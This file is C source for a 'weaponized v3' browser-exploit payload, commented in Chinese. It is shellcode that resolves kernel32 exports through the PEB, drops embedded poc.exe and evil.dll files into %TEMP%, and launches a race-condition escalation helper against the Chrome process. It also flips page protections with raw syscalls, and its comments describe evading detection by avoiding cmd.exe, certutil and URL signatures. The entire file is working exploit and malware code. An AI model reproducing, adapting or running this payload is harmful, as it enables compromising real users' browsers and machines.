/* payload_src_w3.c — 武器化 v3：零 DLL 加载、零网络、零硬编码路径。
 * 页面把 poc.exe/evil.dll 字节直接写进 RX 别名区 scratch（偏移由 g_meta 注入），
 * payload 用 kernel32 已加载导出（全部 REAL，无转发器）落盘到 %TEMP% 并直接
 * CreateProcessA 启动竞态器——无 cmd.exe、无 certutil、无 URL 特征。
 * g_meta[8]（JS 经 arwWrite 填充）: [0]=magic [1]=sizePoc [2]=sizeEvil
 *   [4]=deltaPoc(scratch1-META_OFF) [6]=deltaEvil(scratch2-META_OFF)，delta 为
 *   相对 g_meta 的带符号偏移，payload 用 RIP 相对地址自算绝对地址。 */
typedef unsigned long long u64;
typedef long long i64;
typedef int i32;
typedef unsigned int u32;
typedef unsigned short u16;
typedef unsigned char u8;

__attribute__((naked, used)) static void flip_thread(void) {
  __asm__ volatile(
      "movabsq $0x10201000, %r10\n\t"
      "1:\n\t"
      "movq %r10, %r11\n\t"
      "2:\n\t"
      "movq (%r11), %rax\n\t"
      "testq %rax, %rax\n\t"
      "jz 1b\n\t"
      "subq $0x48, %rsp\n\t"
      "movq %rax, 0x30(%rsp)\n\t"
      "movq $0x1000, 0x38(%rsp)\n\t"
      "movl $0, 0x40(%rsp)\n\t"
      "movq $-1, %rcx\n\t"
      "leaq 0x30(%rsp), %rdx\n\t"
      "leaq 0x38(%rsp), %r9\n\t"
      "movl $1, %r8d\n\t"
      "leaq 0x40(%rsp), %rax\n\t"
      "movq %rax, 0x28(%rsp)\n\t"
      "movl $80, %eax\n\t"
      "movq %rcx, %r10\n\t"
      "syscall\n\t"
      "movq $0x1000, 0x38(%rsp)\n\t"
      "movq $-1, %rcx\n\t"
      "leaq 0x30(%rsp), %rdx\n\t"
      "leaq 0x38(%rsp), %r9\n\t"
      "movl $4, %r8d\n\t"
      "leaq 0x40(%rsp), %rax\n\t"
      "movq %rax, 0x28(%rsp)\n\t"
      "movl $80, %eax\n\t"
      "movq %rcx, %r10\n\t"
      "syscall\n\t"
      "addq $0x48, %rsp\n\t"
      "addq $8, %r11\n\t"
      "pause\n\t"
      "jmp 2b\n\t");
}
__attribute__((naked, used)) static void flip_end_marker(void) {}
__attribute__((used, section(".text"))) static const unsigned char g_pad[0x98] = {0x90};

__attribute__((used, section(".text"))) static const char g_names[] =
  "GetTempPathA\0CreateFileA\0WriteFile\0CloseHandle\0"
  "GetModuleFileNameA\0CreateProcessA\0CreateDirectoryA\0";
/* 偏移(含NUL): GetTempPathA@0 CreateFileA@13 WriteFile@25 CloseHandle@35
 *   GetModuleFileNameA@47 CreateProcessA@66 CreateDirectoryA@81 end@98 */
__attribute__((used, section(".text"))) const u32 g_meta[8] = {
  0x57334D53u, 0, 0, 0, 0, 0, 0, 0 };
__attribute__((used, section(".text"))) static const char g_m1[] = "ms64.exe";
__attribute__((used, section(".text"))) static const char g_m2[] = "ev64.dll";
__attribute__((used, section(".text"))) static const char g_m3[] = "msdb";
__attribute__((used, section(".text"))) static const char g_m4[] = " --handler \"";
__attribute__((used, section(".text"))) static const char g_m5[] = "\" --db \"";
__attribute__((used, section(".text"))) static const char g_suf[] =
  "msdb\" --mode race --iters 8 --pages 41 --calc --dbg";

static __attribute__((always_inline)) inline char* acat(char* d, const char* s) { while (*s) *d++ = *s++; return d; }

static __attribute__((always_inline)) inline int name_eq(volatile const char* e, const char* w) {
  while (*w) { if (*e++ != *w++) return 0; }
  return *e == 0;
}
static __attribute__((always_inline)) inline u64 find_export(u64 mod, const char* want) {
  u32 lfa = *(volatile u32*)(mod + 0x3C);
  volatile u32* pe = (volatile u32*)(mod + lfa);
  if (pe[0] != 0x00004550u) return 0;
  volatile u32* opt = (volatile u32*)((char*)pe + 0x18);
  u32 expRva = *(volatile u32*)((char*)opt + 0x70);
  if (!expRva) return 0;
  volatile u32* exp = (volatile u32*)(mod + expRva);
  u32 nNames = exp[6]; u32 funcsRva = exp[7]; u32 namesRva = exp[8]; u32 ordsRva = exp[9];
  volatile u32* names = (volatile u32*)(mod + namesRva);
  volatile u32* funcs = (volatile u32*)(mod + funcsRva);
  volatile u16* ords  = (volatile u16*)(mod + ordsRva);
  for (u32 i = 0; i < nNames && i < 4096; i++) {
    if (name_eq((volatile const char*)(mod + names[i]), want)) return mod + funcs[ords[i]];
  }
  return 0;
}

__attribute__((noinline, used)) void payload_main(void) {
  u64 peb;
  __asm__ volatile("movq %%gs:0x60, %0" : "=r"(peb));
  u64 base = *(volatile u64*)(peb + 0x10);
  u64 llw  = *(volatile u64*)(base + 0x3BE4B8);
  if (llw < 0x10000 || llw > 0x7ffe00000000ull) return;
  u64 k32 = llw & ~0xFFFull;
  int ok = 0;
  for (int i = 0; i < 512; i++, k32 -= 0x1000ull) {
    if (*(volatile u16*)k32 == 0x5A4Du) {
      u32 lfa2 = *(volatile u32*)(k32 + 0x3C);
      if (lfa2 < 0x400 && *(volatile u32*)(k32 + lfa2) == 0x00004550u) { ok = 1; break; }
    }
  }
  if (!ok) return;
  u64 pTmp  = find_export(k32, g_names);            /* GetTempPathA   @0  */
  u64 pCF   = find_export(k32, g_names + 13);       /* CreateFileA    @13 */
  u64 pWF   = find_export(k32, g_names + 25);       /* WriteFile      @25 */
  u64 pCH   = find_export(k32, g_names + 35);       /* CloseHandle    @35 */
  u64 pGMF  = find_export(k32, g_names + 47);       /* GetModuleFileNameA @47 */
  u64 pCP   = find_export(k32, g_names + 66);       /* CreateProcessA @66 */
  u64 pCD   = find_export(k32, g_names + 81);       /* CreateDirectoryA @81 */
  if (!pTmp || !pCF || !pWF || !pCH || !pGMF || !pCP || !pCD) return;
  u32  (*GetTempPathA)(u32, char*) = (void*)pTmp;
  void* (*CreateFileA)(const char*, u32, u32, void*, u32, u32, void*) = (void*)pCF;
  int   (*WriteFile)(void*, void*, u32, u32*, void*) = (void*)pWF;
  int   (*CloseHandle)(void*) = (void*)pCH;
  u32   (*GetModuleFileNameA)(void*, char*, u32) = (void*)pGMF;
  int   (*CreateProcessA)(const char*, char*, void*, void*, int, u32, void*, const char*, void*, void*) = (void*)pCP;
  int   (*CreateDirectoryA)(const char*, void*) = (void*)pCD;

  volatile u32* mp = (volatile u32*)g_meta;   /* RIP 相对；volatile 防止常量折叠 */
  if (mp[0] != 0x57334D53u) return;
  u32 sp = mp[1], se = mp[2];
  if (!sp || sp > 0x200000u || !se || se > 0x200000u) return;
  i64 dp = (i32)mp[4], de = (i32)mp[6];
  if (dp <= 0 || dp > 0x100000 || de <= 0 || de > 0x100000) return;
  u64 pocAddr = (u64)mp + (u64)dp;
  u64 evAddr  = (u64)mp + (u64)de;

  char tmp[300];
  if (GetTempPathA(276, tmp) == 0) return;
  char path[600];

  char* d = path; d = acat(d, tmp); d = acat(d, g_m3); *d = 0;
  CreateDirectoryA(path, 0);       /* 已存在也无妨 */

  d = path; d = acat(d, tmp); d = acat(d, g_m1); *d = 0;
  void* h = CreateFileA(path, 0x40000000u, 0, 0, 2u, 0x80u, 0);
  if (h == (void*)~(u64)0) return;
  u32 wr = 0;
  int w1 = WriteFile(h, (void*)pocAddr, sp, &wr, 0);
  CloseHandle(h);
  if (!w1 || wr != sp) return;

  d = path; d = acat(d, tmp); d = acat(d, g_m2); *d = 0;
  h = CreateFileA(path, 0x40000000u, 0, 0, 2u, 0x80u, 0);
  if (h == (void*)~(u64)0) return;
  wr = 0;
  int w2 = WriteFile(h, (void*)evAddr, se, &wr, 0);
  CloseHandle(h);
  if (!w2 || wr != se) return;

  char chrome[1044];
  if (GetModuleFileNameA(0, chrome, 1040) == 0) return;

  char cmd[1400];
  d = cmd; *d++ = '"';
  d = acat(d, tmp); d = acat(d, g_m1);
  *d++ = '"';
  d = acat(d, g_m4);              /*  --handler " */
  d = acat(d, chrome);
  d = acat(d, g_m5);              /* " --db " */
  d = acat(d, tmp); d = acat(d, g_suf);
  *d = 0;

  char si[104], pi[24];
  for (int i = 0; i < 104; i++) si[i] = 0;
  *(u32*)si = 68;                 /* si.cb = sizeof(STARTUPINFOA) */
  for (int i = 0; i < 24; i++) pi[i] = 0;
  CreateProcessA(0, cmd, 0, 0, 0, 0, 0, tmp, (void*)si, (void*)pi);
}
